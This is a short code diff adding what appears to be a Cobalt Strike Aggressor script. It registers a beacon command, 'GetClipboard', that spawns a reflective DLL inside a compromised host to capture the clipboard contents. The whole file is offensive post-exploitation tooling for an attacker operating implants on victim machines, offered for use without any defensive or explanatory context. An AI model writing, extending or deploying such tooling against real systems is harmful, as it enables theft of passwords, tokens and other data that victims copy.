@@ -1,0 +1,7 @@
+alias GetClipboard {
+
+    bdllspawn($1, script_resource('reflective_dll_Clipboard.'.barch($1).'.dll'), $null, "GetClipboard Content", 5000);
+
+}
+
+beacon_command_register("GetClipboard", "ReflectiveDLL Get clipboard content" ,"Use: GetClipboard");
